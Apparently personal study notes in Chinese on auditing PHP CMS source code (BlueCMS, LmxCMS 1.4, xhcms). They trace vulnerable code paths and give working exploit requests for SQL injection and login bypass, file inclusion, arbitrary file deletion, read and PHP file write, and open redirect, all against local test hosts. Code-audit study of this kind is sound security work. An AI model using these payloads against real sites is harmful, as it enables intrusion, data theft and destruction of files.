拼接后的 sql 语句为 ：`SELECT COUNT(*) AS num FROM blue_admin WHERE admin_name='運' or sleep(10)#'`

在这份源码只要符合条件均存在GBK注入

### GBK宽字节造成后台任意登录

#### 漏洞原理

`/admin/login.php` 中：

```php
if(check_admin($admin_name, $admin_pwd)){
 		update_admin_info($admin_name);
 		if($remember == 1){
 			setcookie('Blue[admin_id]', $_SESSION['admin_id'], time()+86400);
 			setcookie('Blue[admin_name]', $admin_name, time()+86400);
			setcookie('Blue[admin_pwd]', md5(md5($admin_pwd).$_CFG['cookie_hash']), time()+86400);
 		}
```

check_admin() 函数在 `common.fun.php` 中：

```php
function check_admin($name, $pwd)
{
   global $db;
   $row = $db->getone("SELECT COUNT(*) AS num FROM ".table('admin')." WHERE admin_name='$name' and pwd = md5('$pwd')");  //拼接 sql
   if($row['num'] > 0)
   {
      return true;
   }
   else
   {
      return false;
   }
}
```

#### 漏洞验证

```
POST:   admin_name=%df' or 1=1#
```

<img src=".\图片\Snipaste_2023-04-12_14-48-22.png" alt="Snipaste_2023-04-12_14-48-22" style="zoom:80%;" />

拼接后执行的sql语句为：`SELECT COUNT(*) AS num FROM blue_admin WHERE admin_name='運' or 1=1#' and pwd = md5('aaaaa')`

### 文件包含

在`user.php` 里面存在本地包含漏洞，因为gpc是开启的，可以使用 `.` 进行截断

点号截断
php版本 < 5.2.8 ，linux需要文件名长于4096，windows需要长于256
条件：windows OS，点号需要长于256

重要代码如下：

```php
elseif ($act == 'pay'){
 	include 'data/pay.cache.php';
 	$price = $_POST['price'];
 	$id = $_POST['id'];
 	$name = $_POST['name'];
 	if (empty($_POST['pay'])) {
 		showmsg('对不起，您没有选择支付方式');
 	}
 	include 'include/payment/'.$_POST['pay']."/index.php";
 }
```

验证的数据包如下：

```http
POST /user.php?act=pay HTTP/1.1
Host: www.bluecms.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://www.bluecms.com/user.php?act=index_login
Connection: close
Cookie: PHPSESSID=7c5f8e4175baa8038c2e48a031eb6b45; detail=1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 1237

pay=../../robots.txt......................................................................................................................................................................................................................................................................................................
```

### 任意文件删除

在 user.php 存在 `unlink()` 函数 `$_POST['lit_pic']`  没有任何过滤，存在任意删除漏洞

重要代码如下：

```php
if(file_exists(BLUE_ROOT.$_POST['face_pic3'])){
			@unlink(BLUE_ROOT.$_POST['face_pic3']);
		}
```

`BLUE_ROOT` 是网站的根目录，输入网站文件名即可删除文件，也可以通过目录跳转删除系统某些文件。

验证如下：

```http
POST /user.php?act=edit_user_info HTTP/1.1
Host: www.blue123.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=s6r0lj2at8pfsug33enccccse4; detail=4
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
face_pic3=robots.txt
```

根目录下的robots.txt 被删除

### URL任意跳转

#### 原理

在 `user.php` 中 `$from` 遍历是是从 `$from = !empty($_REQUEST['from']) ? $_REQUEST['from'] : '';`

```php
elseif($act == 'do_login'){
   $user_name     =  !empty($_POST['user_name']) ? trim($_POST['user_name']) : '';
   $pwd         =  !empty($_POST['pwd']) ? trim($_POST['pwd']) : '';
   $safecode      =  !empty($_POST['safecode']) ? trim($_POST['safecode']) : '';
   $useful_time   =  intval($_POST['useful_time']);
   $from = !empty($from) ? base64_decode($from) : 'user.php';
```

$from 存在值用 base64_decode 进行解码

用户登录验证成功后进入 showmsg 函数

```php
showmsg('欢迎您 '.$user_name.' 回来，现在将转到...', $from);
```

跟踪 showmsg 函数，查看函数定义 `include\common.fun.php`

```php
function showmsg($msg,$gourl='goback', $is_write = false)
{
   global $smarty;
   $smarty->caching = false;
   $smarty->assign("msg",$msg);
   $smarty->assign("gourl",$gourl);
   $smarty->display("showmsg.htm");
   if($is_write)
   {
      write_log($msg, $_SESSION['admin_name']);
   }
   exit();
}
```

$from 传入 `$gourl $smarty->assign("gourl",$gourl); smarty` 调用 `showmsg.htm` 替换里面的值 `templates\default\showmsg.htm {#$gourl#}` 就是传入的值

```html
<div class="showmsg">
<h3>BlueCMS提示信息</h3>
<div class="msgcontent">
 <h4 class="msg">{#$msg#}</h4>
 {#if $gourl == 'goback' #}<p class="marginbot"><a class="lightlink" href="javascript:history.back();">点击这里返回<
/a></p>
 {#else#}<p><a class="lightlink" href="{#$gourl#}">如果您的浏览器没有反应，请点击这里</a></p><script
language="javascript" type="text/javascript">setTimeout("location.replace('{#$gourl#}')",'2000');</script>
 {#/if#}
</div>
</div>
</body>
</html>
```

#### 验证

```http
POST /bluecms/user.php?act=index_login HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 80
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8081
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8081/bluecms/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: detail=1; PHPSESSID=6m5cp2krm744tu34h0kc9kao51
Connection: close

user_name=test&pwd=123456&remember=1&x=30&y=12&from=aHR0cHM6Ly93d3cuYmFpZHUuY29t
```



# 思路

## 敏感函数

<img src=".\图片\SUyrKNkESntMtTZoJF_1ug.png" alt="SUyrKNkESntMtTZoJF_1ug" style="zoom:80%;" />

<img src=".\图片\tEzlWxoeP5g-Do36-hzyUg.png" alt="tEzlWxoeP5g-Do36-hzyUg" style="zoom:80%;" />

正则搜索：关于sql注入  `(update|select|insert|delete|).*?where.*=\`



```
#常见漏洞关键字：
SQL注入：
select insert update mysql_query mysqli等
文件上传：
$_FILES，type="file"，上传，move_uploaded_file()等 
XSS跨站：
print print_r echo sprintf die var_dump var_export等
文件包含：
include include_once require require_once等
代码执行：
eval assert preg_replace call_user_func call_user_func_array等
命令执行：
system exec shell_exec `` passthru pcntl_exec popen proc_open
变量覆盖：
extract() parse_str() importrequestvariables() $$ 等
反序列化：
serialize() unserialize() __construct __destruct等
其他漏洞：
unlink() file_get_contents() show_source() file() fopen()等

#通用关键字：
$_GET,$_POST,$_REQUEST,$_FILES,$_SERVER等

功能点或关键字分析可能存在漏洞
抓包或搜索关键字找到代码出处及对应文件
追踪过滤或接受的数据函数，寻找触发此函数或代码的地方进行触发测试

-常规或部分MCV模型源码可以采用关键字的搜索挖掘思路
-框架MCV墨香源码一般会采用功能点分析抓包追踪挖掘思路

```



## 功能点

<img src=".\图片\svV2OifqoKkYl-SeD_t23A.png" alt="svV2OifqoKkYl-SeD_t23A" style="zoom:80%;" />

<img src=".\图片\AKvGYf35Uwjg6E6zW4VViw.png" alt="AKvGYf35Uwjg6E6zW4VViw" style="zoom:80%;" />

## MVC模型

<img src=".\图片\yxdj-PHnHu4asgWDfVZcWg.png" alt="yxdj-PHnHu4asgWDfVZcWg" style="zoom:80%;" />

## 数据库监控（sql注入）

数据库`SQL监控`排查可利用语句定向分析



# 审计实例

## lmxcms1.4（sql）

`1day`：0day的作者未公布详细漏洞信息，只简述抽象描述了相关漏洞。1day就是根据前人的思路，跟随者0day作者公布的信息，找到详细漏洞过程。

### CNVD-2020-59466

<img src=".\图片\Snipaste_2023-04-19_10-30-28.png" alt="Snipaste_2023-04-19_10-30-28" style="zoom:80%;" />

#### thinkphp找路由

```http
http://127.0.0.1:8081/lmxcms1.4/index.php?m=list&a=index&classid=1
```

参数 m：是Controller前端控制器，在 `c/index/ListAction.class.php` 文件里

参数 a ：是 `ListAction.class.php` 里的方法名  `index`

参数 classid ：是 `index` 方法中的参数

<img src=".\图片\Snipaste_2023-04-19_10-39-45.png" alt="Snipaste_2023-04-19_10-39-45" style="zoom:80%;" />

#### 漏洞寻找

知道了 0day 的描述：`梦想CMS后台Bo***.cl***.php文件存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。`

寻找到源码中的漏洞位置：`c/admin/BookAction.class.php` ，并找到**可控参数**与**相应方法**，`reply()` 里的可控参数 `$id` 与 可能敏感方法 `$this->bookModel->getReply(array($id))`

<img src=".\图片\Snipaste_2023-04-19_10-48-08.png" alt="Snipaste_2023-04-19_10-48-08" style="zoom:67%;" />



然后经典操作一步步跟函数，最后找到了执行sql语句的地方，**可控参数 $id** 是未经过滤带入执行 sql 语句的参数：

`BookModel.class.php` 中的 `getReply()` 方法：

```php
//根据留言id获取全部回复
public function getReply(array $id){
    $id = implode(',',$id);
    $param['where'] = 'uid in('.$id.')';
    return parent::selectModel($param);
}
```

`Model.class.php` 里的 `selectModel()` 方法：

```php
//获取数据
protected function selectModel($param=array()){
   if($param['field']){
       $this->field=$param['field'];
   }
   return parent::selectDB($this->tab['0'],$this->field,$param);
}
```

`db.class.php` 里的 `selectDB()` 方法如下，这里有个细节，就是输出 `echo $sql;` ，**手动打印 sql 语句**到前台页面，方便观察：

```php
//查询
protected function selectDB($tab,Array $field,$param=array()){
    $arr = array();
    $field = implode(',',$field);
    $force = '';
    //强制进入某个索引
    if($param['force']) $force = ' force index('.$param['force'].')';
    if($param['ignore']) $force = ' ignore index('.$param['ignore'].')';
    $sqlStr = $this->where($param);
    $sql="SELECT $field FROM ".DB_PRE."$tab$force $sqlStr";
    echo $sql;       // 打印sql语句到前台方便观察
    $result=$this->query($sql);
    while(!!$a=mysql_fetch_assoc($result)){    //报错注入函数
        $arr[]=$a;
    }
    $this->result($result);
    return $arr;
}
```

#### 漏洞验证

根据 thinkphp 找路由的方法，找到后台触发SQL语句的点：

```http
http://127.0.0.1:8081/lmxcms1.4/admin.php?m=book&a=reply&id=3
```

<img src=".\图片\Snipaste_2023-04-19_11-10-30.png" alt="Snipaste_2023-04-19_11-10-30" style="zoom:80%;" />

构造恶意 payload（延时）：

```http
http://127.0.0.1:8081/lmxcms1.4/admin.php?m=book&a=reply&id=3)%20or%20sleep(5)--+
```

构造恶意 payload（报错）：

```http
http://127.0.0.1:8081/lmxcms1.4/admin.php?m=book&a=reply&id=1)%20and%20updatexml(0,concat(0x7e,user()),1)%23
```

<img src=".\图片\Snipaste_2023-04-19_11-30-09.png" alt="Snipaste_2023-04-19_11-30-09" style="zoom:80%;" />



### CNVD-2019-05674

漏洞描述：

```
LmxCMS V1.4前台Ta***.cl***.php存在SQL注入漏洞
```

#### 漏洞寻找

入口在 `c/index/TagsAction.class.php`里的构造函数里，发现一些可能有关的函数， `P()` 函数和 `getNameData()` 函数

```php
public function __construct() {
        parent::__construct();
        $data = p(2,1,1);
        $name = string::delHtml($data['name']);
        if(!$name) _404();
        $name = urldecode($name);  //二次url解码，存在风险，浏览器智能解码一次，函数再解码一次，可考虑二次url编码绕过正则
        if($this->tagsModel == null) $this->tagsModel = new TagsModel();
        $this->data = $this->tagsModel->getNameData($name);
//        if(!$this->data) _404();
    }
```



经典操作一步步跟进， `P()` 函数在 `common.php` 里。分析得，get数据提交参数，函数 `filter_sql()` 和 `mysql_retain()` 为正则过滤sql语句关键字。

```php
/* 验证表单数据
 * $type 1:post数据，2:get数据 否则为$type
 * $pe 是否转义
 * $sql 是否验证sql非法字符
 * $mysql 是否验证mysql保留字符
 */
function p($type=1,$pe=false,$sql=false,$mysql=false){
    if($type == 1){
        $data = $_POST;
    }else if($type == 2){
        $data = $_GET;
    }else{
        $data = $type;
    }
    if($sql) filter_sql($data);
    if($mysql) mysql_retain($data);
    foreach($data as $k => $v){
        if(is_array($v)){
            $newdata[$k] = p($v,$pe,$sql,$mysql);
        }else{
            if($pe){
                $newdata[$k] = string::addslashes($v);
            }else{
                $newdata[$k] = trim($v);
            }
        }
    }
    return $newdata;
}
```



sql语句执行在 `getNameData()` 函数里，我们一步步跟进找到可控参数拼接到sql执行语句里：

`TagsModel.class.php`里：

```php
//根据Tags名字返回id
public function getNameData($name){
    $param['where'] = "name = '$name'";
    return parent::oneModel($param);
}
```

`Model.class.php` 里：

```php
//获取一条数据
protected function oneModel($param){
    return parent::oneDB($this->tab['0'],$this->field,$param);
}
```

`db.class.php` 里：

```php
//查询一条数据
protected function oneDB($tab,Array $field,Array $param){
    $field = implode(',',$field);
    $force = '';
    //强制进入某个索引
    if($param['force']) $force = ' force index('.$param['force'].')';
    if($param['ignore']) $force = ' ignore index('.$param['ignore'].')';
    $We = $this->where($param);
    $sql="SELECT ".$field." FROM ".DB_PRE."$tab$force $We limit 1";
    echo $sql;  //打印sql语句到前台方便观察
    $result=$this->query($sql);
    $data = mysql_fetch_assoc($result);
    return $data ? $data : array();
}
```



#### 漏洞验证

把关键payload二次url编码：

```
a' and updatexml(0,concat(0x7e,user()),1)#
```

```
%61%27%20%61%6e%64%20%75%70%64%61%74%65%78%6d%6c%28%30%2c%63%6f%6e%63%61%74%28%30%78%37%65%2c%75%73%65%72%28%29%29%2c%31%29%23
```

```
%25%36%31%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%37%35%25%37%30%25%36%34%25%36%31%25%37%34%25%36%35%25%37%38%25%36%64%25%36%63%25%32%38%25%33%30%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%31%25%32%39%25%32%33
```



触发报错函数（因为触发TagsAction.class.php里的构造函数，是不用加上参数c，直接加入构造函数里的参数name）：

```http
http://127.0.0.1:8081/lmxcms1.4/?m=tags&name=%25%36%31%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%37%35%25%37%30%25%36%34%25%36%31%25%37%34%25%36%35%25%37%38%25%36%64%25%36%63%25%32%38%25%33%30%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%31%25%32%39%25%32%33
```

<img src=".\图片\Snipaste_2023-04-19_12-00-15.png" alt="Snipaste_2023-04-19_12-00-15" style="zoom:80%;" />

### 技巧一：动态调试

动态调试配置：phpStudy + PhpStorm + XDebug

https://blog.csdn.net/nzjdsds/article/details/100114242

1、先确定PHP版本有Xdebug

2、php.ini配置写入并开启Xdebug

3、PhpStorm设置端口及IDEY并测试

4、PhpStorm开启监听并运行断点访问



当代码过于复杂时，可以使用 XDebug分析执行的流程

### 技巧二：文件代码比对

Beyond Compare 4

当前版本的cms和下个版本的代码对比，发现修改变化的地方，可能就是修复漏洞的地方，也方便我们找当前版本cms的漏洞



## lmxcms1.4（文件）

### 文件删除

CNVD-2020-59469  [国家信息安全漏洞共享平台 (cnvd.org.cn)](https://www.cnvd.org.cn/flaw/show/CNVD-2020-59469)

在 `c/admin/BackdbAction.class.php` 下有删除文件的关键函数

```php
//删除备份文件
    public function delbackdb(){
        $filename = trim($_GET['filename']);
        if(!$filename){
            rewrite::js_back('备份文件不存在');
        }
        $this->delOne($filename);
        addlog('删除数据库备份文件');
        rewrite::succ('删除成功');
    }
```

跟踪到 `delOne()` 函数里看看

```php
//根据文件名删除一条备份文件
private function delOne($filename){
    $dir = ROOT_PATH.'file/back/'.$filename;
    file::unLink($dir);
}
```

显而易见，根据**路径跳跃**，我们构造 payload 删除根路径下的 1.txt：

```http
http://127.0.0.1:8081/lmxcms1.4/admin.php?m=backdb&a=delbackdb&filename=../../1.txt
```

另外补充下：文件删除漏洞有时可以配合cms重新安装，具体就是删除某个特定的文件就可以使cms重装。

### 文件读取写入

搜索关键函数 `file_get_contents`，在 `class/file.class.php` 下：

```php
//获取文件内容
public static function getcon($path){
    if(is_file($path)){
        if(!$content = file_get_contents($path)){
            rewrite::js_back('请检查【'.$path.'】是否有读取权限');
        }else{
            return $content;
        }
    }else{
        rewrite::js_back('请检查【'.$path.'】文件是否存在');
    }
}
```

接下来找谁调用了`getcon()` 函数，于是在 `c/admin/TemplateAction.class.php`下找到了调用：

```php
//编辑和查看文件与图像
public function editfile(){
    $dir = $_GET['dir'];
    //保存修改
    if(isset($_POST['settemcontent'])){
        if($this->config['template_edit']){
            rewrite::js_back('系统设置禁止修改模板文件');
        }
        file::put($this->config['template'].$dir.'/'.$_POST['filename'],string::stripslashes($_POST['temcontent']));
        addlog('修改模板文件'.$this->config['template'].$dir);
        rewrite::succ('修改成功','?m=Template&a=opendir&dir='.$dir);
        exit();
    }
    $pathinfo = pathinfo($dir);
    //获取文件内容
    $content = string::html_char(file::getcon($this->config['template'].$dir));
    echo $this->config['template'];   //调试输出路径
    $this->smarty->assign('filename',$pathinfo['basename']);
    $this->smarty->assign('temcontent',$content);
    $this->smarty->assign('dir',dirname($_GET['dir']));
    $this->smarty->display('Template/temedit.html');
}
```



接下来调试输出路径，看看 `config['template']`  路径是啥，原来在 `/template/` 下：

<img src=".\图片\Snipaste_2023-04-25_15-46-31.png" alt="Snipaste_2023-04-25_15-46-31" style="zoom:80%;" />

再就是常规功能测试，读取根目录的 `index.php`

```http
http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Template&a=editfile&dir=../index.php
```

<img src=".\图片\Snipaste_2023-04-25_15-48-51.png" alt="Snipaste_2023-04-25_15-48-51" style="zoom:80%;" />



再就是任意文件写入的实现，根进函数 `put()`

```php
//保存文件
public static function put($path,$data){
    if(file_put_contents($path,$data) === false)
        rewrite::js_back('请检查【'.$path.'】是否有读写权限');
}
```

最终得出payload：

```http
get：admin.php?m=template&a=editfile&dir=../
post：settemcontent=1&temcontent=<?php phpinfo();?>&filename=1.php
```



## xhcms（包含）

index.php下：

```php
<?php
//单一入口模式
error_reporting(0); //关闭错误显示
$file=addslashes($_GET['r']); //接收文件名
$action=$file==''?'index':$file; //判断为空或者等于index
include('files/'.$action.'.php'); //载入相应文件，后缀必须是php。php版本低可以截断，也可使用伪协议
?>
```

后缀必须是php，假设存在`1.txt.php`如下：

```php
<?php
phpinfo();
?>
```

则包含的payload：`http://127.0.0.1:8081/xhcms/?r=1.txt` 执行 phpinfo()






